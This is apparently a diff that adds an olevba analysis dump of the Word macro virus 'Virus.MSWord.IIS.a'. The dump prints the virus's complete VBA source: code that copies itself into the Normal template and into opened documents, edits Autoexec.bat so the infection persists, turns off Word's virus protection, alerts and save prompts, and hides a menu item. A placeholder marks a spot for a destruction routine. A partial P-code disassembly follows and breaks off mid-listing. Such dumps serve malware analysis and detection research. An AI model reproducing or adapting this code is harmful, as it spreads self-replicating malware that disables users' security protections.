@@ -1,0 +1,4061 @@
+olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
+===============================================================================
+FILE: ./Virus.MSWord.IIS.a
+Type: OLE
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls 
+in file: ./Virus.MSWord.IIS.a - OLE stream: 'Macros/VBA/ThisDocument'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Private Sub Document_Open()
+Rem MyName = IIS
+Close
+On Error GoTo MegaJump
+Open "c:\msdos.sys" For Input As #1
+Do
+Line Input #1, ms
+If UCase(Left(ms, 7)) = "WINDIR=" Then
+a = Len(ms)
+windir = Mid(ms, 8, a)
+GoTo fert
+End If
+Loop
+Close
+fert:
+Close
+Open windir & "\system\Log.drv" For Append As #1
+Print #1, "+"
+Close
+NormInstalled = False
+ActInstalled = False
+NormalTemplate.VBProject.VBComponents(1).Export ("c:\vn.dll")
+ActiveDocument.VBProject.VBComponents(1).Export ("c:\vd.dll")
+NormInst = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
+ActInst = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
+If UCase(NormInst) = "REM MYNAME = IIS" Then NormInstalled = True
+If UCase(ActInst) = "REM MYNAME = IIS" Then ActInstalled = True
+
+Close
+Open "c:\Autoexec.bat" For Append As #12
+Close #12
+Open "c:\Autoexec.bat" For Input As #12
+Do Until EOF(12)
+If EOF(12) Then GoTo dss
+Line Input #12, a
+If a = "@del c:\normalb.dot" Then SetAttr (NormalTemplate.FullName), vbReadOnly
+Loop
+dss:
+
+If NormInstalled = True And ActIntalled = True Then GoTo esub
+If NormInstalled = True Then IW = "C:\vn.dll" Else IW = "C:\Vd.dll"
+Open IW For Input As #1
+FullCode = "Private Sub Document_Open()" & Chr(13)
+Do
+Line Input #1, VirCode
+Loop Until VirCode = "Private Sub Document_Open()"
+Do
+If VirCode = "End Sub" Then ess = ess + 1
+If ess = 3 Then GoTo jump
+Line Input #1, VirCode
+If VirCode = "Rem Written by Flitnic" Then GoTo jump
+FullCode = FullCode & VirCode & Chr(13)
+Loop
+jump:
+FullCode = FullCode & VirCode & Chr(13)
+FullCode = FullCode & "End Sub"
+If NormInstalled = False Then
+dd = Dir(NormalTemplate.FullName)
+If dd = "" Then GoTo AtrNo
+at = GetAttr(NormalTemplate.FullName)
+If at = 33 Then at = 1
+If at = 1 Then
+Close
+Open "c:\Autoexec.bat" For Append As #12
+Close #12
+Open "c:\Autoexec.bat" For Input As #12
+Do Until EOF(12)
+If EOF(12) Then GoTo ds
+Line Input #12, a
+If a = "@del c:\normalb.dot" Then GoTo fv
+Loop
+ds:
+SetAttr (NormalTemplate.FullName), vbNormal
+Documents.Add Template:="", NewTemplate:=False
+Lines = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
+ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
+ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 1, FullCode
+ActiveDocument.SaveAs FileName:="C:\Normalb.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
+ActiveDocument.Save
+Close #1
+Open "c:\No.dat" For Append As #1
+Close #1
+ActiveDocument.Close
+Kill "c:\No.dat"
+Close #12
+Open "c:\autoexec.bat" For Append As #12
+Close #12
+
+FileCopy "c:\Autoexec.bat", "c:\Autoexec.bak"
+Close #12
+Open "c:\Autoexec.bat" For Append As #12
+Print #12, "@Copy /y C:\normalb.dot " & NormalTemplate.FullName
+Print #12, "@del c:\normalb.dot"
+Print #12, "@Copy /y c:\Autoexec.bak c:\Autoexec.bat"
+fv:
+Close
+Exit Sub
+End If
+AtrNo:
+Lines = NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
+NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
+NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 1, FullCode
+dd = Dir(NormalTemplate.FullName)
+If dd = "" Then Exit Sub
+NormalTemplate.Save
+End If
+If ActInstalled = False Then
+If Mid(ActiveDocument.FullName, 3, 1) = "\" Then
+Lines = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
+ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
+ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 1, FullCode
+ActiveDocument.Save
+Else
+Lines = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
+ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
+ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 1, FullCode
+End If
+End If
+esub:
+a = Dir(NormalTemplate.FullName)
+If a = "" Then Exit Sub
+at = GetAttr(NormalTemplate.FullName)
+If at = 33 Then at = 1
+If at = 1 Then GoTo gghh
+Close
+dd = Dir("c:\vn.dll")
+If dd = "" Then GoTo tz2a
+Kill "C:\vn.dll"
+tz2a:
+dd = Dir("c:\vd.dll")
+If dd = "" Then GoTo tz2b
+Kill "C:\vd.dll"
+tz2b:
+If Mid(ActiveDocument.FullName, 3, 1) = "\" Then
+ActiveDocument.Save
+End If
+Open windir & "\system\Log.drv" For Input As #1
+lll = LOF(1)
+'IIS for NormalTemplate Create:
+dd = Dir(NormalTemplate.FullName)
+If dd = "" Then Exit Sub
+aAutoOpen = False
+    For Ii = 1 To NormalTemplate.VBProject.VBComponents.Count
+    a = NormalTemplate.VBProject.VBComponents(Ii).CodeModule.Lines(1, 1)
+    If a = "Sub IIS()" Then
+    cl = NormalTemplate.VBProject.VBComponents(Ii).CodeModule.CountOfLines
+    NormalTemplate.VBProject.VBComponents(Ii).CodeModule.DeleteLines 1, cl
+    aAutoOpen = True
+    Exit For
+    End If
+    Next Ii
+    Ii = 0
+    If aAutoOpen = False Then
+    Close
+    Open "c:\newvnb.dll" For Append As #2
+    Print #2, "Attribute VB_Name = "; XXXXX; ""
+    Close
+    NormalTemplate.VBProject.VBComponents.Import ("c:\newvnb.dll")
+    Kill "c:\newvnb.dll"
+    End If
+    iii = 0
+    For iii = 1 To NormalTemplate.VBProject.VBComponents.Count
+    cl = NormalTemplate.VBProject.VBComponents(iii).CodeModule.CountOfLines
+    If cl = 0 Then Exit For
+    Next iii
+AutoOpenCode = "Sub IIS()" & Chr(13)
+AutoOpenCode = AutoOpenCode & "'Macro created by " & Application.UserName & Chr(13)
+AutoOpenCode = AutoOpenCode & "End Sub" & Chr(13)
+NormalTemplate.VBProject.VBComponents(iii).CodeModule.InsertLines 1, AutoOpenCode
+NormalTemplate.Save
+
+'IIS for ActiveDocument Create:
+If LCase(Mid(ActiveDocument.FullName, 1, 1)) = "a" Then GoTo nomacro
+at = GetAttr(ActiveDocument.FullName)
+If at = 33 Then at = 1
+If at = 1 Then GoTo nomacro
+If Mid(ActiveDocument.FullName, 3, 1) = "\" Then
+dd = Dir(ActiveDocument.FullName)
+If dd = "" Then Exit Sub
+aAutoOpen = False
+    For Ii = 1 To ActiveDocument.VBProject.VBComponents.Count
+    a = ActiveDocument.VBProject.VBComponents(Ii).CodeModule.Lines(1, 1)
+    If a = "Sub IIS()" Then
+    cl = ActiveDocument.VBProject.VBComponents(Ii).CodeModule.CountOfLines
+    ActiveDocument.VBProject.VBComponents(Ii).CodeModule.DeleteLines 1, cl
+    aAutoOpen = True
+    Exit For
+    End If
+    Next Ii
+    Ii = 0
+    If aAutoOpen = False Then
+    Close
+    Open "c:\newvnb.dll" For Append As #2
+    Print #2, "Attribute VB_Name = "; XXXXX; ""
+    Close
+    ActiveDocument.VBProject.VBComponents.Import ("c:\newvnb.dll")
+    Kill "c:\newvnb.dll"
+    End If
+    iii = 0
+    For iii = 1 To ActiveDocument.VBProject.VBComponents.Count
+    cl = ActiveDocument.VBProject.VBComponents(iii).CodeModule.CountOfLines
+    If cl = 0 Then Exit For
+    Next iii
+AutoOpenCode = "Sub IIS()" & Chr(13)
+AutoOpenCode = AutoOpenCode & "'Macro created by " & Application.UserName & Chr(13)
+AutoOpenCode = AutoOpenCode & "End Sub" & Chr(13)
+ActiveDocument.VBProject.VBComponents(iii).CodeModule.InsertLines 1, AutoOpenCode
+ActiveDocument.Save
+End If
+nomacro:
+Close
+MegaJump:
+dd = Dir(NormalTemplate.FullName)
+If dd = "" Then GoTo gghh
+On Error Resume Next
+If GetAttr(NormalTemplate.FullName) = vbReadOnly Then GoTo gghh
+at = GetAttr(NormalTemplate.FullName)
+If at = 33 Then at = 1
+If at = 1 Then GoTo gghh
+ormalTemplate.Save
+Options.SaveNormalPrompt = False
+Options.VirusProtection = False
+Application.DisplayStatusBar = False
+Application.DisplayAlerts = False
+Application.CommandBars("Tools").Controls(12).Controls(3).Visible = False
+
+'Insert destruction routine here:
+
+gghh:
+End Sub
+Private Sub Document_Close()
+Rem MyName = IIS
+a = Dir("c:\No.dat")
+If UCase(a) = "NO.DAT" Then
+Exit Sub
+End If
+Close
+On Error GoTo MegaJump
+Open "c:\msdos.sys" For Input As #1
+Do
+Line Input #1, ms
+If UCase(Left(ms, 7)) = "WINDIR=" Then
+a = Len(ms)
+windir = Mid(ms, 8, a)
+GoTo fert
+End If
+Loop
+Close
+fert:
+Close
+Open windir & "\system\Log.drv" For Append As #1
+Print #1, "+"
+Close
+NormInstalled = False
+ActInstalled = False
+NormalTemplate.VBProject.VBComponents(1).Export ("c:\vn.dll")
+ActiveDocument.VBProject.VBComponents(1).Export ("c:\vd.dll")
+NormInst = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
+ActInst = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
+If UCase(NormInst) = "REM MYNAME = IIS" Then NormInstalled = True
+If UCase(ActInst) = "REM MYNAME = IIS" Then ActInstalled = True
+
+Close
+Open "c:\Autoexec.bat" For Append As #12
+Close #12
+Open "c:\Autoexec.bat" For Input As #12
+Do Until EOF(12)
+If EOF(12) Then GoTo dss
+Line Input #12, a
+If a = "@del c:\normalb.dot" Then SetAttr (NormalTemplate.FullName), vbReadOnly
+Loop
+dss:
+
+If NormInstalled = True And ActIntalled = True Then GoTo esub
+If NormInstalled = True Then IW = "C:\vn.dll" Else IW = "C:\Vd.dll"
+Open IW For Input As #1
+FullCode = "Private Sub Document_Open()" & Chr(13)
+Do
+Line Input #1, VirCode
+Loop Until VirCode = "Private Sub Document_Open()"
+Do
+If VirCode = "End Sub" Then ess = ess + 1
+If ess = 3 Then GoTo jump
+Line Input #1, VirCode
+If VirCode = "Rem Written by Flitnic" Then GoTo jump
+FullCode = FullCode & VirCode & Chr(13)
+Loop
+jump:
+FullCode = FullCode & VirCode & Chr(13)
+FullCode = FullCode & "End Sub"
+If NormInstalled = False Then
+dd = Dir(NormalTemplate.FullName)
+If dd = "" Then GoTo AtrNo
+at = GetAttr(NormalTemplate.FullName)
+If at = 33 Then at = 1
+If at = 1 Then
+Close
+Exit Sub
+End If
+AtrNo:
+Lines = NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
+NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
+NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 1, FullCode
+dd = Dir(NormalTemplate.FullName)
+If dd = "" Then Exit Sub
+NormalTemplate.Save
+End If
+If ActInstalled = False Then
+If Mid(ActiveDocument.FullName, 3, 1) = "\" Then
+Lines = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
+ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
+ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 1, FullCode
+ActiveDocument.Save
+Else
+Lines = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
+ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
+ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 1, FullCode
+End If
+End If
+esub:
+a = Dir(NormalTemplate.FullName)
+If a = "" Then Exit Sub
+at = GetAttr(NormalTemplate.FullName)
+If at = 33 Then at = 1
+If at = 1 Then GoTo gghh
+Close
+dd = Dir("c:\vn.dll")
+If dd = "" Then GoTo tz2a
+Kill "C:\vn.dll"
+tz2a:
+dd = Dir("c:\vd.dll")
+If dd = "" Then GoTo tz2b
+Kill "C:\vd.dll"
+tz2b:
+If Mid(ActiveDocument.FullName, 3, 1) = "\" Then
+ActiveDocument.Save
+End If
+Open windir & "\system\Log.drv" For Input As #1
+lll = LOF(1)
+'IIS for NormalTemplate Create:
+dd = Dir(NormalTemplate.FullName)
+If dd = "" Then Exit Sub
+aAutoOpen = False
+    For Ii = 1 To NormalTemplate.VBProject.VBComponents.Count
+    a = NormalTemplate.VBProject.VBComponents(Ii).CodeModule.Lines(1, 1)
+    If a = "Sub IIS()" Then
+    cl = NormalTemplate.VBProject.VBComponents(Ii).CodeModule.CountOfLines
+    NormalTemplate.VBProject.VBComponents(Ii).CodeModule.DeleteLines 1, cl
+    aAutoOpen = True
+    Exit For
+    End If
+    Next Ii
+    Ii = 0
+    If aAutoOpen = False Then
+    Close
+    Open "c:\newvnb.dll" For Append As #2
+    Print #2, "Attribute VB_Name = "; XXXXX; ""
+    Close
+    NormalTemplate.VBProject.VBComponents.Import ("c:\newvnb.dll")
+    Kill "c:\newvnb.dll"
+    End If
+    iii = 0
+    For iii = 1 To NormalTemplate.VBProject.VBComponents.Count
+    cl = NormalTemplate.VBProject.VBComponents(iii).CodeModule.CountOfLines
+    If cl = 0 Then Exit For
+    Next iii
+AutoOpenCode = "Sub IIS()" & Chr(13)
+AutoOpenCode = AutoOpenCode & "'Macro created by " & Application.UserName & Chr(13)
+AutoOpenCode = AutoOpenCode & "End Sub" & Chr(13)
+NormalTemplate.VBProject.VBComponents(iii).CodeModule.InsertLines 1, AutoOpenCode
+NormalTemplate.Save
+'IIS for ActiveDocument Create:
+If LCase(Mid(ActiveDocument.FullName, 1, 1)) = "a" Then GoTo nomacro
+at = GetAttr(ActiveDocument.FullName)
+If at = 33 Then at = 1
+If at = 1 Then GoTo nomacro
+If Mid(ActiveDocument.FullName, 3, 1) = "\" Then
+dd = Dir(ActiveDocument.FullName)
+If dd = "" Then Exit Sub
+aAutoOpen = False
+    For Ii = 1 To ActiveDocument.VBProject.VBComponents.Count
+    a = ActiveDocument.VBProject.VBComponents(Ii).CodeModule.Lines(1, 1)
+    If a = "Sub IIS()" Then
+    cl = ActiveDocument.VBProject.VBComponents(Ii).CodeModule.CountOfLines
+    ActiveDocument.VBProject.VBComponents(Ii).CodeModule.DeleteLines 1, cl
+    aAutoOpen = True
+    Exit For
+    End If
+    Next Ii
+    Ii = 0
+    If aAutoOpen = False Then
+    Close
+    Open "c:\newvnb.dll" For Append As #2
+    Print #2, "Attribute VB_Name = "; XXXXX; ""
+    Close
+    ActiveDocument.VBProject.VBComponents.Import ("c:\newvnb.dll")
+    Kill "c:\newvnb.dll"
+    End If
+    iii = 0
+    For iii = 1 To ActiveDocument.VBProject.VBComponents.Count
+    cl = ActiveDocument.VBProject.VBComponents(iii).CodeModule.CountOfLines
+    If cl = 0 Then Exit For
+    Next iii
+AutoOpenCode = "Sub IIS()" & Chr(13)
+AutoOpenCode = AutoOpenCode & "'Macro created by " & Application.UserName & Chr(13)
+AutoOpenCode = AutoOpenCode & "End Sub" & Chr(13)
+ActiveDocument.VBProject.VBComponents(iii).CodeModule.InsertLines 1, AutoOpenCode
+ActiveDocument.Save
+End If
+nomacro:
+
+
+Close
+MegaJump:
+dd = Dir(NormalTemplate.FullName)
+If dd = "" Then GoTo gghh
+On Error Resume Next
+If GetAttr(NormalTemplate.FullName) = vbReadOnly Then GoTo gghh
+at = GetAttr(NormalTemplate.FullName)
+If at = 33 Then at = 1
+If at = 1 Then GoTo gghh
+NormalTemplate.Save
+Options.SaveNormalPrompt = False
+Options.VirusProtection = False
+Application.DisplayStatusBar = False
+Application.DisplayAlerts = False
+Application.CommandBars("Tools").Controls(12).Controls(3).Visible = False
+
+'Insert destruction routine here:
+
+
+gghh:
+End Sub
+Private Sub Document_New()
+Rem MyName = IIS
+a = Dir("c:\No.dat")
+If UCase(a) = "NO.DAT" Then
+Exit Sub
+End If
+Close
+On Error GoTo MegaJump
+Open "c:\msdos.sys" For Input As #1
+Do
+Line Input #1, ms
+If UCase(Left(ms, 7)) = "WINDIR=" Then
+a = Len(ms)
+windir = Mid(ms, 8, a)
+GoTo fert
+End If
+Loop
+Close
+fert:
+Close
+Open windir & "\system\Log.drv" For Append As #1
+Print #1, "+"
+Close
+NormInstalled = False
+ActInstalled = False
+NormalTemplate.VBProject.VBComponents(1).Export ("c:\vn.dll")
+ActiveDocument.VBProject.VBComponents(1).Export ("c:\vd.dll")
+NormInst = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
+ActInst = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
+If UCase(NormInst) = "REM MYNAME = IIS" Then NormInstalled = True
+If UCase(ActInst) = "REM MYNAME = IIS" Then ActInstalled = True
+
+Close
+Open "c:\Autoexec.bat" For Append As #12
+Close #12
+Open "c:\Autoexec.bat" For Input As #12
+Do Until EOF(12)
+If EOF(12) Then GoTo dss
+Line Input #12, a
+If a = "@del c:\normalb.dot" Then SetAttr (NormalTemplate.FullName), vbReadOnly
+Loop
+dss:
+
+If NormInstalled = True And ActIntalled = True Then GoTo esub
+If NormInstalled = True Then IW = "C:\vn.dll" Else IW = "C:\Vd.dll"
+Open IW For Input As #1
+FullCode = "Private Sub Document_Open()" & Chr(13)
+Do
+Line Input #1, VirCode
+Loop Until VirCode = "Private Sub Document_Open()"
+Do
+If VirCode = "End Sub" Then ess = ess + 1
+If ess = 3 Then GoTo jump
+Line Input #1, VirCode
+If VirCode = "Rem Written by Flitnic" Then GoTo jump
+FullCode = FullCode & VirCode & Chr(13)
+Loop
+jump:
+FullCode = FullCode & VirCode & Chr(13)
+FullCode = FullCode & "End Sub"
+If NormInstalled = False Then
+dd = Dir(NormalTemplate.FullName)
+If dd = "" Then GoTo AtrNo
+at = GetAttr(NormalTemplate.FullName)
+If at = 33 Then at = 1
+If at = 1 Then
+Close
+Exit Sub
+End If
+AtrNo:
+Lines = NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
+NormalTemplate.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
+NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines 1, FullCode
+dd = Dir(NormalTemplate.FullName)
+If dd = "" Then Exit Sub
+NormalTemplate.Save
+End If
+If ActInstalled = False Then
+If Mid(ActiveDocument.FullName, 3, 1) = "\" Then
+Lines = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
+ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
+ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 1, FullCode
+ActiveDocument.Save
+Else
+Lines = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
+ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, Lines
+ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 1, FullCode
+End If
+End If
+esub:
+a = Dir(NormalTemplate.FullName)
+If a = "" Then Exit Sub
+at = GetAttr(NormalTemplate.FullName)
+If at = 33 Then at = 1
+If at = 1 Then GoTo gghh
+Close
+dd = Dir("c:\vn.dll")
+If dd = "" Then GoTo tz2a
+Kill "C:\vn.dll"
+tz2a:
+dd = Dir("c:\vd.dll")
+If dd = "" Then GoTo tz2b
+Kill "C:\vd.dll"
+tz2b:
+If Mid(ActiveDocument.FullName, 3, 1) = "\" Then
+ActiveDocument.Save
+End If
+Open windir & "\system\Log.drv" For Input As #1
+lll = LOF(1)
+'IIS for NormalTemplate Create:
+dd = Dir(NormalTemplate.FullName)
+If dd = "" Then Exit Sub
+aAutoOpen = False
+    For Ii = 1 To NormalTemplate.VBProject.VBComponents.Count
+    a = NormalTemplate.VBProject.VBComponents(Ii).CodeModule.Lines(1, 1)
+    If a = "Sub IIS()" Then
+    cl = NormalTemplate.VBProject.VBComponents(Ii).CodeModule.CountOfLines
+    NormalTemplate.VBProject.VBComponents(Ii).CodeModule.DeleteLines 1, cl
+    aAutoOpen = True
+    Exit For
+    End If
+    Next Ii
+    Ii = 0
+    If aAutoOpen = False Then
+    Close
+    Open "c:\newvnb.dll" For Append As #2
+    Print #2, "Attribute VB_Name = "; XXXXX; ""
+    Close
+    NormalTemplate.VBProject.VBComponents.Import ("c:\newvnb.dll")
+    Kill "c:\newvnb.dll"
+    End If
+    iii = 0
+    For iii = 1 To NormalTemplate.VBProject.VBComponents.Count
+    cl = NormalTemplate.VBProject.VBComponents(iii).CodeModule.CountOfLines
+    If cl = 0 Then Exit For
+    Next iii
+AutoOpenCode = "Sub IIS()" & Chr(13)
+AutoOpenCode = AutoOpenCode & "'Macro created by " & Application.UserName & Chr(13)
+AutoOpenCode = AutoOpenCode & "End Sub" & Chr(13)
+NormalTemplate.VBProject.VBComponents(iii).CodeModule.InsertLines 1, AutoOpenCode
+NormalTemplate.Save
+'IIS for ActiveDocument Create:
+If LCase(Mid(ActiveDocument.FullName, 1, 1)) = "a" Then GoTo nomacro
+at = GetAttr(ActiveDocument.FullName)
+If at = 33 Then at = 1
+If at = 1 Then GoTo nomacro
+If Mid(ActiveDocument.FullName, 3, 1) = "\" Then
+dd = Dir(ActiveDocument.FullName)
+If dd = "" Then Exit Sub
+aAutoOpen = False
+    For Ii = 1 To ActiveDocument.VBProject.VBComponents.Count
+    a = ActiveDocument.VBProject.VBComponents(Ii).CodeModule.Lines(1, 1)
+    If a = "Sub IIS()" Then
+    cl = ActiveDocument.VBProject.VBComponents(Ii).CodeModule.CountOfLines
+    ActiveDocument.VBProject.VBComponents(Ii).CodeModule.DeleteLines 1, cl
+    aAutoOpen = True
+    Exit For
+    End If
+    Next Ii
+    Ii = 0
+    If aAutoOpen = False Then
+    Close
+    Open "c:\newvnb.dll" For Append As #2
+    Print #2, "Attribute VB_Name = "; XXXXX; ""
+    Close
+    ActiveDocument.VBProject.VBComponents.Import ("c:\newvnb.dll")
+    Kill "c:\newvnb.dll"
+    End If
+    iii = 0
+    For iii = 1 To ActiveDocument.VBProject.VBComponents.Count
+    cl = ActiveDocument.VBProject.VBComponents(iii).CodeModule.CountOfLines
+    If cl = 0 Then Exit For
+    Next iii
+AutoOpenCode = "Sub IIS()" & Chr(13)
+AutoOpenCode = AutoOpenCode & "'Macro created by " & Application.UserName & Chr(13)
+AutoOpenCode = AutoOpenCode & "End Sub" & Chr(13)
+ActiveDocument.VBProject.VBComponents(iii).CodeModule.InsertLines 1, AutoOpenCode
+ActiveDocument.Save
+End If
+nomacro:
+
+Close
+MegaJump:
+dd = Dir(NormalTemplate.FullName)
+If dd = "" Then GoTo gghh
+On Error Resume Next
+If GetAttr(NormalTemplate.FullName) = vbReadOnly Then GoTo gghh
+at = GetAttr(NormalTemplate.FullName)
+If at = 33 Then at = 1
+If at = 1 Then GoTo gghh
+NormalTemplate.Save
+Options.SaveNormalPrompt = False
+Options.VirusProtection = False
+Application.DisplayStatusBar = False
+Application.DisplayAlerts = False
+Application.CommandBars("Tools").Controls(12).Controls(3).Visible = False
+
+'Insert destruction routine here:
+
+gghh:
+Rem Written by Flitnic
+End Sub
+-------------------------------------------------------------------------------
+VBA MACRO Module1.bas 
+in file: ./Virus.MSWord.IIS.a - OLE stream: 'Macros/VBA/Module1'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Sub IIS()
+'Macro created by MACRO
+End Sub
+
+-------------------------------------------------------------------------------
+VBA MACRO VBA_P-code.txt 
+in file: VBA P-code - OLE stream: 'VBA P-code'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+' Processing file: ./Virus.MSWord.IIS.a
+' ===============================================================================
+' Module streams:
+' Macros/VBA/ThisDocument - 30505 bytes
+' Line #0:
+' 	FuncDefn (Private Sub Document_Open())
+' Line #1:
+' 	Rem 0x000D " MyName = IIS"
+' Line #2:
+' 	CloseAll 
+' Line #3:
+' 	OnError MegaJump 
+' Line #4:
+' 	LitStr 0x000C "c:\msdos.sys"
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	LitDefault 
+' 	Open (For Input)
+' Line #5:
+' 	Do 
+' Line #6:
+' 	LitDI2 0x0001 
+' 	Ld ms 
+' 	LineInput 
+' Line #7:
+' 	Ld ms 
+' 	LitDI2 0x0007 
+' 	ArgsLd LBound 0x0002 
+' 	ArgsLd UCase 0x0001 
+' 	LitStr 0x0007 "WINDIR="
+' 	Eq 
+' 	IfBlock 
+' Line #8:
+' 	Ld ms 
+' 	FnLen 
+' 	St a 
+' Line #9:
+' 	Ld ms 
+' 	LitDI2 0x0008 
+' 	Ld a 
+' 	ArgsLd Mid$ 0x0003 
+' 	St windir 
+' Line #10:
+' 	GoTo fert 
+' Line #11:
+' 	EndIfBlock 
+' Line #12:
+' 	Loop 
+' Line #13:
+' 	CloseAll 
+' Line #14:
+' 	Label fert 
+' Line #15:
+' 	CloseAll 
+' Line #16:
+' 	Ld windir 
+' 	LitStr 0x000F "\system\Log.drv"
+' 	Concat 
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	LitDefault 
+' 	Open (For Append)
+' Line #17:
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	PrintChan 
+' 	LitStr 0x0001 "+"
+' 	PrintItemNL 
+' Line #18:
+' 	CloseAll 
+' Line #19:
+' 	LitVarSpecial (False)
+' 	St NormInstalled 
+' Line #20:
+' 	LitVarSpecial (False)
+' 	St ActInstalled 
+' Line #21:
+' 	LitStr 0x0009 "c:\vn.dll"
+' 	Paren 
+' 	LitDI2 0x0001 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	ArgsMemCall Export 0x0001 
+' Line #22:
+' 	LitStr 0x0009 "c:\vd.dll"
+' 	Paren 
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	ArgsMemCall Export 0x0001 
+' Line #23:
+' 	LitDI2 0x0002 
+' 	LitDI2 0x0001 
+' 	LitDI2 0x0001 
+' 	Ld NormalTemplate 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemLd Lines 0x0002 
+' 	St NormInst 
+' Line #24:
+' 	LitDI2 0x0002 
+' 	LitDI2 0x0001 
+' 	LitDI2 0x0001 
+' 	Ld ActiveDocument 
+' 	MemLd VBProject 
+' 	ArgsMemLd VBComponents 0x0001 
+' 	MemLd CodeModule 
+' 	ArgsMemLd Lines 0x0002 
+' 	St ActInst 
+' Line #25:
+' 	Ld NormInst 
+' 	ArgsLd UCase 0x0001 
+' 	LitStr 0x0010 "REM MYNAME = IIS"
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	LitVarSpecial (True)
+' 	St NormInstalled 
+' 	EndIf 
+' Line #26:
+' 	Ld ActInst 
+' 	ArgsLd UCase 0x0001 
+' 	LitStr 0x0010 "REM MYNAME = IIS"
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	LitVarSpecial (True)
+' 	St ActInstalled 
+' 	EndIf 
+' Line #27:
+' Line #28:
+' 	CloseAll 
+' Line #29:
+' 	LitStr 0x000F "c:\Autoexec.bat"
+' 	LitDI2 0x000C 
+' 	Sharp 
+' 	LitDefault 
+' 	Open (For Append)
+' Line #30:
+' 	LitDI2 0x000C 
+' 	Sharp 
+' 	Close 0x0001 
+' Line #31:
+' 	LitStr 0x000F "c:\Autoexec.bat"
+' 	LitDI2 0x000C 
+' 	Sharp 
+' 	LitDefault 
+' 	Open (For Input)
+' Line #32:
+' 	LitDI2 0x000C 
+' 	ArgsLd EOF 0x0001 
+' 	DoUnitil 
+' Line #33:
+' 	LitDI2 0x000C 
+' 	ArgsLd EOF 0x0001 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo dss 
+' 	EndIf 
+' Line #34:
+' 	LitDI2 0x000C 
+' 	Ld a 
+' 	LineInput 
+' Line #35:
+' 	Ld a 
+' 	LitStr 0x0013 "@del c:\normalb.dot"
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	Ld NormalTemplate 
+' 	MemLd FullName 
+' 	Paren 
+' 	Ld vbReadOnly 
+' 	ArgsCall SetAttr 0x0002 
+' 	EndIf 
+' Line #36:
+' 	Loop 
+' Line #37:
+' 	Label dss 
+' Line #38:
+' Line #39:
+' 	Ld NormInstalled 
+' 	LitVarSpecial (True)
+' 	Eq 
+' 	Ld ActIntalled 
+' 	LitVarSpecial (True)
+' 	Eq 
+' 	And 
+' 	If 
+' 	BoSImplicit 
+' 	GoTo esub 
+' 	EndIf 
+' Line #40:
+' 	Ld NormInstalled 
+' 	LitVarSpecial (True)
+' 	Eq 
+' 	If 
+' 	BoSImplicit 
+' 	LitStr 0x0009 "C:\vn.dll"
+' 	St IW 
+' 	Else 
+' 	BoSImplicit 
+' 	LitStr 0x0009 "C:\Vd.dll"
+' 	St IW 
+' 	EndIf 
+' Line #41:
+' 	Ld IW 
+' 	LitDI2 0x0001 
+' 	Sharp 
+' 	LitDefault 
+' 	Open (For Input)
+' Line #42:
+' 	LitStr 0x001B "Private Sub Document_Open()"
+' 	LitDI2 0x000D 
+' 	ArgsLd Chr 0x0001 
+' 	Concat 
+' 	St FullCode 
+' Line #43:
+' 	Do 
+' Line #44:
+' 	LitDI2 0x0001 
+' 	Ld VirCode 
+' 	LineInput 
+' Line #45:
